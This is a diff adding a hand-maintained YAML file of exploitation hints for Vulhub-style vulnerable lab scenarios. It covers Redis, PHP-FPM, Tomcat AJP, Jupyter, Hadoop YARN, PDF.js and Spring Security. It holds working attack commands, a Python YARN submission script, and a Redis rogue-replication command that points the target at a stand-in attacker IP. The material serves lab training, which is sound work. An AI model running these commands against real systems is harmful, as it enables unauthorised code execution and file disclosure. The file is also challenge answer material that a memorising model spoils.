@@ -1,0 +1,117 @@
+# Authored supplements for sparse or screenshot-only reproduction sections.
+# Command provenance: each recipe's adjacent README, screenshots, or source files.
+# This file is maintained by hand; generate_vulnhub_hints.py preserves its contents.
+java/rmi-codebase:
+  - title: Identify the RMI object and prerequisite
+    instructions: |
+      Enumerate the RMI registry on TCP 1099:
+
+      ```bash
+      nmap -Pn -sV --script rmi-dumpregistry -p 1099 {{NODE_IP}}
+      ```
+
+      The recipe binds the object `refObj`; its `ICalc.sum(List<Integer>)` method is served on TCP 64000.
+      The JVM enables remote codebase loading with `java.rmi.server.useCodebaseOnly=false`.
+      A compatible Java RMI client can supply remotely hosted class definitions during deserialization.
+      This requires the target to reach the class-hosting server and the advertised RMI address to be reachable.
+      The recipe defaults that advertised address to 127.0.0.1; the deployed scenario must configure it correctly.
+      The upstream reproduction section is unfinished and supplies no runnable exploit client. These are confirmed
+      entry points and prerequisites from the included Java source, not a verified exploitation command.
+redis/4-unacc:
+  - title: Reproduce the documented Redis module attack
+    instructions: |
+      Obtain the public PoC from https://github.com/vulhub/redis-rogue-getshell.
+      From that tool's checkout, use the command shown in the recipe screenshot:
+
+      ```bash
+      python redis-master.py -r {{NODE_IP}} -p 6379 -L YOUR_ATTACKER_IP -P 8888 -f RedisModulesSDK/exp.so -c "id"
+      ```
+
+      Replace YOUR_ATTACKER_IP with your reachable participant-machine IP; port 8888 is the rogue
+      replication listener on that machine, not a target scan port. The PoC makes the target replicate
+      a module, loads it, executes `id`, and restores replication settings. The screenshot shows a
+      Redis-user identity as the successful result. The tool checkout must contain or build `RedisModulesSDK/exp.so`.
+php/fpm:
+  - title: Send PHP through the exposed FastCGI interface
+    instructions: |
+      Obtain the public FastCGI PoC from https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
+      and save the script as fpm3.py. The recipe screenshot demonstrates:
+
+      ```bash
+      python fpm3.py {{NODE_IP}} /usr/local/lib/php/PEAR.php -c '<?php echo `id`; exit; ?>'
+      ```
+
+      The target is FastCGI on TCP 9000, not an HTTP service. The PoC requires an existing PHP script path;
+      this recipe uses `/usr/local/lib/php/PEAR.php`. A response containing the PHP worker's user identity
+      confirms execution. Use the Python version required by the downloaded PoC.
+tomcat/CVE-2020-1938:
+  - title: Read the web application descriptor through AJP
+    instructions: |
+      Obtain the public PoC from https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.
+      The recipe screenshot reads the web application descriptor with:
+
+      ```bash
+      python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/web.xml {{NODE_IP}}
+      ```
+
+      AJP uses TCP 8009; the ordinary HTTP page uses 8080. A returned XML web-app descriptor
+      confirms file disclosure. File reading alone does not establish shell access: code execution
+      additionally requires attacker-controlled content in the web application and successful inclusion.
+jupyter/notebook-rce:
+  - title: Open an unauthenticated terminal
+    instructions: |
+      Open http://{{NODE_IP}}:8888 and select New → Terminal without supplying a notebook token or password.
+      In the resulting target terminal, run:
+
+      ```bash
+      id
+      pwd
+      ```
+
+      The commands run under the notebook service account. Use that terminal to inspect the
+      challenge artifact path supplied by the scenario.
+hadoop/unauthorized-yarn:
+  - title: Submit an application through the exposed ResourceManager API
+    instructions: |
+      The included exploit.py uses the unauthenticated application API. This minimal adaptation submits `id`
+      instead of requiring a reverse-shell listener:
+
+      ```python
+      import requests
+      base = 'http://{{NODE_IP}}:8088/ws/v1/cluster/apps'
+      created = requests.post(base + '/new-application', timeout=10)
+      created.raise_for_status()
+      application_id = created.json()['application-id']
+      response = requests.post(base, json={
+          'application-id': application_id,
+          'application-name': 'identity-check',
+          'am-container-spec': {'commands': {'command': 'id'}},
+          'application-type': 'YARN',
+      }, timeout=10)
+      response.raise_for_status()
+      print(application_id, response.status_code)
+      ```
+
+      Inspect the application's output logs in the ResourceManager UI for the execution identity.
+      The submission response alone confirms acceptance, not successful command execution.
+pdfjs/CVE-2024-4367:
+  - title: Open the supplied PDF proof of concept
+    instructions: |
+      Download the recipe's public PDF fixture:
+      https://github.com/vulhub/vulhub/raw/3af973a39bd0988f288a53fa9ea4b82372774e58/pdfjs/CVE-2024-4367/poc.pdf
+      Open http://{{NODE_IP}}:8080 and upload that file through the provided form, then open it in
+      the vulnerable PDF.js viewer. The malicious PDF triggers JavaScript in the viewer's browser context;
+      this demonstrates client-side execution, not a server shell.
+spring/CVE-2022-22978:
+  - title: Bypass the admin route matcher with an encoded newline
+    instructions: |
+      Compare the protected admin route with the two newline variants documented by the recipe:
+
+      ```bash
+      curl -i http://{{NODE_IP}}:8080/admin
+      curl --path-as-is -i 'http://{{NODE_IP}}:8080/admin/%0atest'
+      curl --path-as-is -i 'http://{{NODE_IP}}:8080/admin/%0dtest'
+      ```
+
+      The unmodified route is denied; a newline variant reaches the admin page because the regex matcher
+      does not match the newline in the same way as the application route.
